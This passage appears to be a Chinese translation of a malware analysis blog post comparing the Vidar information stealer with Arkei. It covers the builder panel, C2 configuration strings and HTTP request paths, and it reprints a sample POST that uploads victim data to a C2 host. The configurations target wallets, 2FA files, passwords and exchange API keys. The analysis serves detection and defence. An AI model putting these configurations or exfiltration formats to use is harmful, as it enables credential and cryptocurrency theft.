###  密码
###  Builder
Builder界面也很有趣，可以在这里看到使用者的操作日志。此外， 在下载部分生成的恶意软件和Arkei一样，并不会打包。
因此用户者必须使用加密/打包软件来对payload进行处理。
###  设置
显而易见，这是最重要的界面，因为在这里可以生成payload。可以通过设置，启用（或不启用）某些功能来达到对目标机器进行针对性攻击。
因此，通过配置，Vidar可以同时执行多项功能。这意味着当payload感染受害者主机后，根据配置，窃取到的各项信息将保存在对应的文件夹中。获取到窃取的文件后，攻击者通过排序，可以很轻松的查看各项信息。
当编辑或创建新规则时，将弹出此界面来实现之前提到的功能。恶意软件将到所有可能存在的路径下去检索指定的文件。
经分析，我们发现在C2上，有许多配置项。以下是我们能找到的：
默认空配置：
    1,1,1,1,1,1,1,1,0,1,250,none;
默认初始配置：
    1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
用户配置示例：
    1,1,1,1,1,1,1,1,1,1,250,grabba;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;100;true;movies:music:mp3;
    1,1,0,1,1,1,1,1,1,1,250,инфа;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
    1,1,1,1,1,1,1,1,1,1,250,Первое;%DESKTOP%;*.txt:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*;50;true;movies:music:mp3;
    1,1,1,1,1,1,1,1,1,1,250,123435566;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
    1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
同时执行多项配置：
    1,1,1,1,1,1,0,1,1,1,250,
    DESKTOP;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*2fa*.png:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
    DOCUMENTS;%DOCUMENTS%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
    DRIVE_REMOVABLE;%DRIVE_REMOVABLE%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
如上文中所示，通过特定的格式，将其分为三个部分，三项配置分别为：
  * DESKTOP
  * DOCUMENTS
  * DRIVE_REMOVABLE
它们将各自存储在对应的文件夹中。
所有配置信息都可以在我的[github](https://github.com/Fmk0/work/tree/master/Vidar)仓库中找到。
通过对配置面板的介绍，可以看出窃密软件无论是在loader模块，还是投递手段等方面，都变的越来越类似。
正如一开始提到的，用户只能通过该界面对恶意软件进行配置，具体的管理由维护团队来负责。为了防止代理被过滤，控制域名将定期进行更换。（这一点在样本中也很容易看出来，因为不同的版本将对应不同的域名）
如官方声明所说，在用户界面，还存在2FA认证。
## 一些有趣的信息
在登录界面搜索信息时，将看到一些有趣的信息。
让我们看看背后隐藏着什么？
原来是一个彩蛋，来告诉大家Vidar(维达)是北欧神话中的复仇之神。
## Vidar—山寨版Arkei？
如果关注相关request（请求）和代码，会发现Vidar几乎与Arkei相同。虽然在某些方面略有不同，但所有功能都是相同的。如果蓝队成员只是根据沙箱运行结果进行判断，就会被迷惑。因为目前的Yara规则会将触发条件的Vidar当做Arkei，这会导致错误的检测结果。因此对代码进行分析是非常有必要的，这样才能弄清楚它是如何运行的。
他们（Vidar&Arkei）的主要功能非常相似：
保存窃取到信息的方法也一样。所以很难通过这些方面对二者进行区分。
###  代码差异
一个简单的判断方法就是看有没有“Vidar.cpp”这个字符串。
**Vidar的签名**
**Arkei的签名**
###  通信差异
分析人员可能会误认为Vidar与Arkei构造的HTTP 请求是不同的，然而事实并非如此。
**Vidar HTTP 请求**
    / (i.e 162)    <- 配置信息
    ip-api.com/line/    <- 获取网络配置信息
    /msvcp140.dll       <- 获取DLL文件
    /nss3.dll           <- 获取DLL文件
    /softokn3.dll       <- 获取DLL文件
    /vcruntime140.dll   <- 获取DLL文件
    /                   <- 向C2上传受害者信息
一个小的区别是Arkei不会下载二进制文件，而Vidar则会下载执行一些窃密模块时所需的相关二进制文件。
**Arkei HTTP请求**
    /index.php        <- 配置信息
    ip-api.com/line/  <- 获取网络配置信息
    /index.php        <- 向C2上传受害者信息
**配置参数**
如果你想弄清楚Arkei中各配置参数的含义，可以参考下表：
可以看到，POST发生了轻微的变化，Vidar添加了配置文件名、版本等新字段。
我们可以通过PCAP数据流来更清楚的看出request中的异同，可以看到除了除了版本信息和配置信息，其他部分都是相同的（不同之处用星号标记)。如果我们分析更老的版本，将发现除了请求的路径之外，没有其他区别
**最后的POST请求—Vidar**
    POST / HTTP/1.1
    Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
    Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
    Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
    Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
    Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
    Content-Length: 66809
    Host: some.lovely.vidar.c2.with.love
    Connection: Keep-Alive
    Cache-Control: no-cache
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="hwid"
    90059c37-1320-41a4-b58d-2b75a9850d2f
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="os"
    Windows 7 Professional
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="platform"
    x86
    **--1BEF0A57BE110FD467A**
    **Content-Disposition: form-data; name="profile"**
    **XXX <- Random Int**
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="user"
    admin
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="cccount"
    0
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="ccount"
    0
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="fcount"
    0
    **--1BEF0A57BE110FD467A**
    **Content-Disposition: form-data; name="telegram"**
    0
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="ver"
    **4.1**
    --1BEF0A57BE110FD467A
    Content-Disposition: form-data; name="logs"; filename="COUNTRY_.zip"
    Content-Type: zip
###  功能差异
通过对不同功能的分析，
我发现在Vidar中一些功能并没有实现。比如Steam信息窃取和Skype信息窃取，在Arkei中是有这些功能的，而在Vidar中，并没有实现。但相反的，对于2FA
信息的窃取，只有Vidar能做到。（至少根据我获取到的样本是这样）
## Arkei是否仍活跃？
在一个售卖此窃密软件的页面可以看到，该软件仍在被出售并保持更新。可以看到不久的将来将发布v10版本，所以让我们拭目以待，看看它有哪些变化。